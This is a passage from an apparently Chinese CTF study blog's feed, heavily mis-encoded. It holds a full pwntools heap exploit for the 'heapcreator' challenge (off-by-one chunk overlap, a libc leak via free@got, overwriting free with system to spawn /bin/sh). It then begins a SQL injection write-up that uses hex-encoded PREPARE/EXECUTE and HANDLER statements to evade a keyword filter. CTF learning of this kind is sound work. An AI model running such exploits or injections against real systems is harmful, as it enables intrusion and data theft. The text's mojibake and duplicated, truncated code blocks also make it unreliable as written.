;<br>};<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/23.jpg" alt=""><br>åˆ†æeditåŠŸèƒ½<br>æ ¹æ®indexå¯»æ‰¾chunk<br>å¦‚æœå­˜åœ¨åˆ™å¯ä»¥ç¼–è¾‘<br>ä½†è¯»å…¥contentçš„æ—¶å€™å­˜åœ¨off-by-oneæ¼æ´ï¼Œå¦‚å›¾æ‰€ç¤º<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/24.jpg" alt=""><br>è¿™å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeä½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/25.jpg" alt=""><br>åˆ†æshowåŠŸèƒ½<br>åŒæ ·æ ¹æ®indexå¯»æ‰¾chunkï¼Œå¦‚æœå¯¹åº”çš„heaparrayå­˜åœ¨åˆ™è¾“å‡ºsizeå’Œcontent<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/26.jpg" alt=""><br>æœ€ååˆ†ædeleteåŠŸèƒ½<br>deleteåŠŸèƒ½æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œfreeçš„åŒæ—¶å°†æŒ‡é’ˆç½®0</p><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œç¨‹åºå­˜åœ¨çš„æ¼æ´å­˜åœ¨äºedit<br>å…ˆé”‹è£…ä¸€ä¸‹å‡½æ•°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"1"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(size))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"1"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(size))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br></code></pre></td></tr></tbody></table></figure><p>æ€è€ƒä¸€ä¸‹å¦‚ä½•getshellï¼Œç¨‹åºåªå¼€å¯äº†Partial RELROï¼Œé‚£ä¹ˆå¯ä»¥å°†free@gotä¿®æ”¹æˆsystem@gotï¼Œå†å¤Ÿé€ å‡ºä¸€ä¸ªå†…å®¹ä¸º/bin/shçš„chunkï¼Œå°†å…¶freeå³å¯<br>é‚£ä¹ˆæˆ‘ä»¬å…ˆåˆ›å»º2ä¸ªchunk(å®é™…ä¸Šä¸€å…±åˆ›å»ºäº†4ä¸ª)</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaa'</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string"><code class="language-hljs python">create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaa'</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'bbbb'</span>)<br></code></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/27.jpg" alt=""><br>æˆ‘ä»¬å°†ç¬¬ä¸€ä¸ªcontentèµ‹å€¼ä¸º/bin/shï¼Œå¹¶ä¸”é€šè¿‡æº¢å‡ºå°†ä¸‹é¢ä¸¤ä¸ªchunkåˆå¹¶ä¸ºä¸€ä¸ª</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number"><code class="language-hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x41</span>))<br></code></pre></td></tr></tbody></table></figure><p>å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/28.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸçš„å°†heap[1]çš„å¤§å°ä¿®æ”¹æˆäº†heap[1]+content[1]<br>æˆ‘ä»¬deleteæ‰heap[1]ï¼Œå°±å°†contentä¸€èµ·freeæ‰äº†ï¼Œfastbinä¸­å°±å­˜åœ¨äº†ä¸€ä¸ª0x20å¤§å°å’Œ0x40å¤§å°çš„chunkã€‚ä¹‹åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0x30(å®é™…ä¸º0x40)çš„chunkï¼Œé¦–å…ˆä¼šmallocä¸€ä¸ª0x20å¤§å°çš„chunkä½œä¸ºheapï¼Œè¿™æ ·åŸæœ¬ä½œä¸ºold content[1]çš„chunkå°±è¢«åˆ†é…ç»™äº†new heap[1],è€Œåˆ†é…ç»™new content[1]çš„0x40å¤§å°çš„chunkåˆ™åŒ…å«äº†old heap[1]+old content[1],ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶new content[1]æ¥ä¿®æ”¹new heap[1]dçš„å€¼ã€‚<br>äºæ˜¯æˆ‘ä»¬å°†new heap[1]æŒ‡å‘new content[1]çš„æŒ‡é’ˆæ”¹ä¸ºfree@gotï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬è¾“å‡ºnew content[1]æ—¶ï¼Œå°±ä¼šå»è¾“å‡ºfreeåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä»è€Œæ³„éœ²libcåŸºåœ°å€</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(elf.got[<span class="hljs-string">'free'</span>]))<br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">"Content : "</span>)<br>data = io.recvuntil(<span class="hljs-string">"Done !"</span>)<br><br>free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<br>libc = free_addr - libc.symbols[<span class="hljs-string">'free'</span>] <br><span class="hljs-keyword">print</span> <span class="hljs-string">"libc:"</span>,hex(libc)<br>system = libc + <span class="hljs-number"><code class="language-hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(elf.got[<span class="hljs-string">'free'</span>]))<br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">"Content : "</span>)<br>data = io.recvuntil(<span class="hljs-string">"Done !"</span>)<br><br>free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<br>libc = free_addr - libc.symbols[<span class="hljs-string">'free'</span>] <br><span class="hljs-keyword">print</span> <span class="hljs-string">"libc:"</span>,hex(libc)<br>system = libc + <span class="hljs-number">0x45390</span><br></code></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/29.jpg" alt=""></p><p>æœ€åæˆ‘ä»¬å°†free@gotä¿®æ”¹ä¸ºsystem@gotï¼Œå†freeæ‰content[0]å³å¯getshell</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number"><code class="language-hljs python">edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><p>å®Œæ•´expå¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">"debug"</span><br><br>io=process(<span class="hljs-string">'./heapcreator'</span>)<br><span class="hljs-comment">#io=remote("node3.buuoj.cn",27942)</span><br>elf=ELF(<span class="hljs-string">'heapcreator'</span>)<br>libc=ELF(<span class="hljs-string">'libc-2.23_x64.so'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"1"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(size))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaa'</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'bbbb'</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(elf.got[<span class="hljs-string">'free'</span>]))<br><span class="hljs-comment">#gdb.attach(io)</span><br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">"Content : "</span>)<br>data = io.recvuntil(<span class="hljs-string">"Done !"</span>)<br><br>free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<br>libc = free_addr - libc.symbols[<span class="hljs-string">'free'</span>] <br><span class="hljs-keyword">print</span> <span class="hljs-string">"libc:"</span>,hex(libc)<br>system = libc + <span class="hljs-number">0x45390</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">"debug"</span><br><br>io=process(<span class="hljs-string">'./heapcreator'</span>)<br><span class="hljs-comment">#io=remote("node3.buuoj.cn",27942)</span><br>elf=ELF(<span class="hljs-string">'heapcreator'</span>)<br>libc=ELF(<span class="hljs-string">'libc-2.23_x64.so'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"1"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(size))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.send(str(idx))<br><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaa'</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'bbbb'</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(elf.got[<span class="hljs-string">'free'</span>]))<br><span class="hljs-comment">#gdb.attach(io)</span><br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">"Content : "</span>)<br>data = io.recvuntil(<span class="hljs-string">"Done !"</span>)<br><br>free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<br>libc = free_addr - libc.symbols[<span class="hljs-string">'free'</span>] <br><span class="hljs-keyword">print</span> <span class="hljs-string">"libc:"</span>,hex(libc)<br>system = libc + <span class="hljs-number">0x45390</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å †æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLæ³¨å…¥</title>
      <link href="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/"/>
      <url>/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/</url>
      
        <content type="html"><![CDATA[<p>å¤ä¹ äº†ä¸€ä¸‹SQLæ³¨å…¥ï¼Œå‘è§‰è¿˜å¾ˆæœ‰ä¸€éƒ¨åˆ†çŸ¥è¯†ç‚¹æ²¡æŒæ¡ï¼Œè®°å½•ä¸€ä¸‹<br>ä»¥2019å¼ºç½‘æ¯éšä¾¿æ³¨ä¸ºä¾‹ï¼Œä¹‹å‰æ˜¯ç”¨çš„æ›´æ”¹åˆ—åå’Œè¡¨åæ¥åšçš„ï¼Œä½†ç›¸å¯¹äºåˆ©ç”¨MySQLé¢„å¤„ç†è¯­å¥æ¥åšè¦éº»çƒ¦å¾ˆå¤šï¼Œå…ˆäº†è§£ä¸€ä¸‹MySQLçš„é¢„å¤„ç†è¯­å¥</p><figure class="hljs highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><code class="language-hljs sql">è¯­æ³•ï¼š<br>å®šä¹‰é¢„å¤„ç†è¯­å¥<br>PREPARE stmt_name FROM preparable_stmt;<br>æ‰§è¡Œé¢„å¤„ç†è¯­å¥<br>EXECUTE stmt_name [USING @var_name [, @var_name] ...];<br>åˆ é™¤(é‡Šæ”¾)å®šä¹‰<br>{DEALLOCATE | DROP} PREPARE stmt_name;<br>setè¯­å¥å¯ç”¨äºå‘ç³»ç»Ÿå˜é‡æˆ–ç”¨æˆ·å˜é‡èµ‹å€¼ï¼Œé’ˆå¯¹ç”¨æˆ·å˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š<br>SET @var_name = expr [, @var_name = expr] ...<br></code></pre></td></tr></tbody></table></figure><p>ç®€å•æ¥è¯´ï¼Œé¢„å®šä¹‰è¯­å¥å°±ç±»ä¼¼äºCçš„defineå…³é”®å­—<br>å†æ¥çœ‹é¢˜<br>æˆ‘ä»¬å·²ç»çŸ¥é“äº†flagåœ¨1919810931114514è¡¨ä¸­<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/1.jpg" alt=""><br>ä¸åœ¨æˆ‘ä»¬å½“å‰è¡¨ä¸­ï¼Œéœ€è¦è·¨è¡¨æŸ¥è¯¢ï¼Œä½†èƒ½å¤ŸæŸ¥è¯¢çš„è¯­å¥éƒ½è¢«è¿‡æ»¤æ‰äº†<br>è¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢„å®šä¹‰è¯­å¥ï¼Œå¦‚ä¸‹</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">Set</span> @a=<span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<br><span class="hljs-comment">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460æ˜¯select * from `1919810931114514`çš„16è¿›åˆ¶ç¼–ç </span><br><span class="hljs-keyword">Prepare</span> x <span class="hljs-keyword">from</span> @a<br><span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">Set</span> @a=<span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<br><span class="hljs-comment">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460æ˜¯select * from `1919810931114514`çš„16è¿›åˆ¶ç¼–ç </span><br><span class="hljs-keyword">Prepare</span> x <span class="hljs-keyword">from</span> @a<br><span class="hljs-keyword">Execute</span> x<br></code></pre></td></tr></tbody></table></figure><p>ç¬¬ä¸€å¥ç›¸å½“äºæŠŠå˜é‡@aèµ‹å€¼ä¸º0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>ç¬¬äºŒå¥å°†@aé¢„ç¼–è¯‘ä¸ºx<br>ç¬¬ä¸‰å¥æ‰§è¡Œx<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/2.jpg" alt=""><br>å¯ä»¥è·å¾—flag</p><p>å†æ¥çœ‹å¦ä¸€ç§æ–¹æ³•</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">handlerè¯­å¥ä»£æ›¿selectæŸ¥è¯¢<br>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­<br></code></pre></td></tr></tbody></table></figure><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs sql">è¯­æ³•ç»“æ„<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] <span class="hljs-keyword">alias</span>]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> | PREV | <span class="hljs-keyword">LAST</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword"><code class="language-hljs sql">è¯­æ³•ç»“æ„<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] <span class="hljs-keyword">alias</span>]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> index_name { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> | PREV | <span class="hljs-keyword">LAST</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> { <span class="hljs-keyword">FIRST</span> | <span class="hljs-keyword">NEXT</span> }<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [<span class="hljs-keyword">LIMIT</span> ... ]<br><br><span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">CLOSE</span><br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ç”¨æœ¬åœ°çš„sqli-labçš„secruityåº“çš„usersè¡¨æ¥æµ‹è¯•<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/4.jpg" alt=""><br>èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œåœ°è¯»å–è¡¨ä¸­çš„å†…å®¹<br>å†å›åˆ°é¢˜ç›®<br>æˆ‘ä»¬çš„sqlè¯­å¥å¦‚ä¸‹</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">handler</span> \<span class="hljs-string">`1919810931114514\`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a <br><span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">handler</span> \<span class="hljs-string">`1919810931114514\`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a <br><span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span 